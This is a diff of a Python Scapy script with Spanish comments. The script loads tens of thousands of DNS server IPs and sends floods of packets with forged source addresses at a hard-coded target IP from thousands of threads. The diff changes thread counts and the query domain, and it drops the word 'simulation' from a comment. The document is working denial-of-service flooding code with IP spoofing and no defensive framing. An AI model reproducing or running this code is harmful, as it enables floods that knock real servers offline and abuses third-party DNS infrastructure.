@@ -7,12 +7,12 @@ import time
 dns_ips_file = "nameservers_50k.txt"  # Nombre de tu archivo con las IPs de DNS
 
 # Dirección de destino (tu servidor web)
-target_ip = "51.79.83.115"  # La IP de tu servidor web (Asegúrate de usar la IP correcta de tu servidor web)
+target_ip = "51.79.83.115"  # La IP de tu servidor web 
 target_port = 80  # Puerto de destino (ajústalo si usas otro puerto, este es para la consulta DNS)
 
 # Número de hilos y paquetes por hilo
-threads = 50000  # Número de hilos concurrentes
-packets_per_thread = 50000  # Paquetes por hilo
+threads = 5000  # Número de hilos concurrentes
+packets_per_thread = 5000  # Paquetes por hilo
 
 # Control de la tasa de solicitudes por segundo (para evitar saturación rápida)
 requests_per_second = 100000  # Solicitudes por segundo
@@ -32,9 +32,9 @@ def generate_dns_traffic(dns_ips):
         # Rotar las IPs de manera balanceada
         dns_ip = random.choice(dns_ips)
         
-        # Falsificación de la IP de origen (servidor DNS), dirección de destino sigue siendo tu servidor web
-        # Aquí se crea un paquete DNS con una IP de origen falsa, apuntando a tu servidor web como destino
-        packet = IP(src=dns_ip, dst=target_ip) / UDP(sport=random.randint(1024, 65535), dport=53) / DNS(rd=1, qd=DNSQR(qname="h4acktest12.fwh.is"))
+        # Falsificación de la IP de origen (servidor DNS), dirección de destino sigue siendo el servidor web
+        # Aquí se crea un paquete DNS con una IP de origen falsa, apuntando al servidor web como destino
+        packet = IP(src=dns_ip, dst=target_ip) / UDP(sport=random.randint(1024, 65535), dport=53) / DNS(rd=1, qd=DNSQR(qname="aquicolocascualquierweb.com"))
         
         # Enviar el paquete
         send(packet, verbose=False)
@@ -57,7 +57,7 @@ def start_dns_traffic(dns_ips):
 # Cargar las IPs de servidores DNS desde el archivo
 dns_ips = load_dns_ips(dns_ips_file)
 if dns_ips:
-    # Iniciar la simulación de tráfico DNS
+    # Iniciar el tráfico DNS
     start_dns_traffic(dns_ips)
 else:
     print("No se pudo cargar la lista de servidores DNS desde el archivo.")
